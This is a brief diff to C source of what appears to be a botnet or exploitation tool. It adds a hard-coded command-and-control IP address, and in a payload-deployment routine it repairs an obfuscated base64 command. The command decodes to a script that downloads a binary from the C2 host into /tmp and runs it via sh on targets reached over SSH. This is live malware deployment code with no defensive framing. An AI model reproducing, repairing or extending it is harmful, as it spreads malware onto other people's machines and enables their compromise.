@@ -17,6 +17,10 @@
 #include <curl/curl.h>
 #include "config.h"
 #include "exploit_db.h"
+
+#ifndef C2_HOST
+#define C2_HOST "93.95.231.134"
+#endif
 #include "report_system.h"
 #include "ascii_art.h"
 
@@ -504,7 +508,7 @@ int deploy_payload_advanced(const char *target_ip, int port, const char *user, c
     // This is a small busybox downloader encoded in base64
     char cmd_embedded[1024];
     snprintf(cmd_embedded, sizeof(cmd_embedded),
-        "cd /tmp;echo 'IyEvYmluL3NoCndnZXQgaHR0cDovLyVzOjgwODAvaGlndXJhc2hpX21pbmkgLU8gaCA' | "
+        "cd /tmp;echo 'IyEvYmluL3NoCndnZXQgaHR0cDovLyVzOjgwODAvaGlndXJhc2hpX21pbmkgLU8gaA==' | "
         "base64 -d | sh&", c2_ip);
     
     // Try SSH deployment
